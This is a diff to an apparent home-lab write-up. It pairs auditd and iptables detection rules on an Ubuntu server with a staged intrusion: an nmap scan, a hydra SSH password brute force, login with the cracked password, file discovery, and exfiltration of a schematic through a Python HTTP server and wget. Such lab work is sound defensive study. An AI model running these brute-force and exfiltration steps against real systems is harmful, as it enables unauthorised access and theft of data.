@@ -31,6 +31,7 @@ We have some sensitive data we want to protect. Schematics in folder PROJECT.552
 So we configure a few custom rules to help us out.<br>
 
 <pre data-label="auditctl"><code>
+<div style="--delay: 0s;">
 <span class="orange"><strong>root@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer# auditctl -l
 -w /home/lead_engineer/PROJECT.5527/Frame_specs.txt -p rwa -k file_agitated
 </code></pre>
@@ -42,6 +43,7 @@ This one will monitor interactions with the file and create a log entry with the
 This is the custom rule that will fire based on the log entry.
 
 <pre data-label="auditctl"><code>
+<div style="--delay: 1.2s;">
 <span class="orange"><strong>root@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer# sudo iptables -S
 -A INPUT -p tcp -m multiport --dports 22,80,443,3306<br> -m state --state NEW -j LOG --log-prefix <span class="orange"><strong>"BUREAU-SCAN: "</strong></span>
 -A INPUT -p tcp -m tcp --dport 8000 -m state --state NEW<br> -j LOG --log-prefix <span class="orange"><strong>"BUREAU-EXFIL-HTTP: "</strong></span>
@@ -74,6 +76,7 @@ We assemble our modest selection of penetraton tools and begin.<br>
 
 ## 01.Server Recognisence Using nmap
 <pre data-label="nmap scan"><code>
+<div style="--delay: 0s;">
 <span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$ nmap -p 22,80,443,3306 TECH-BUREAU
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-21 16:11 CET
@@ -95,6 +98,7 @@ Lovley.<br>
 
 ## 02.SSH credential Hydra Attack
 <pre data-label="hydra bruteforce"><code>
+<div style="--delay: 2.2s;">
 <span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$ hydra -l intern -P ROCK_YOU_10.txt ssh://TECH-BUREAU
 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
@@ -112,6 +116,7 @@ We are succesful at discovering the correct password. We have **SSH** credential
 
 ## 03.SSH IN TO THE SERVER
 <pre data-label="SSH"><code>
+<div style="--delay: 3s;">
 <span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$ ssh intern@TECH-BUREAU
 intern@tech-bureau's password:<span class="orange"><strong>football</strong></span>
 </code></pre>
@@ -119,6 +124,7 @@ We SSH under the username *intern* the destination is **TECH-BUREAU** and the pa
 
 ## 04.TARGET FILE SEARCH
 <pre data-label="find the specs"><code>
+<div style="--delay: 1.5s;">
 <span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home$ find . -type f -name "Frame*"
 find: ‘./lead_engineer/.cache’: Permission denied
 find: ‘./lead_engineer/.local/share’: Permission denied
@@ -130,6 +136,7 @@ We are in, using the **find** command we search for the file *Frame_specs.txt*<b
 
 ## 05.CHECK DIRECTORY AND CONCATINATE
 <pre data-label="ls and cat"><code>
+<div style="--delay: 0s;">
 <span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/PROJECT.5527$ ls
 <span class="red"><strong>Frame_specs.txt</strong></span>
 <span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/PROJECT.5527$ cat Frame_specs.txt
@@ -150,6 +157,7 @@ We have changed the directory and located the coveted schematic. we use the humb
 
 ## 06.ESTABLISHING A PYTHON SERVER
 <pre data-label="http.server"><code>
+<div style="--delay: 1s;">
 <span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/PROJECT.5527$ python3 -m http.server 8000
   
 Serving HTTP on 0.0.0.0 port <span class="orange"><strong>8000</strong></span> (http://0.0.0.0:8000/) ...
@@ -158,6 +166,7 @@ With the file confirmed we want to snatch it for our industrial espionage purpos
 
 ## 07.EXFILTRATE VIA ATTACK TERMINAL
 <pre data-label="wget"><code>
+<div style="--delay: 0.5s;">
 <span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>~/BUREAU.01$ wget http://TECH-BUREAU:8000/Frame_specs.txt
 --2026-02-21 16:23:12--  http://tech-bureau:8000/Frame_specs.txt
 Resolving tech-bureau (tech-bureau)... 192.168.1.10
@@ -174,6 +183,7 @@ With the file secured safely on our attack machine we are done with this server 
 
 ## 08.LEAVE
 <pre data-label="exit"><code>
+<div style="--delay: 2.3s;">
 <span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/PROJECT.5527$ exit
 logout
 Connection to tech-bureau closed.
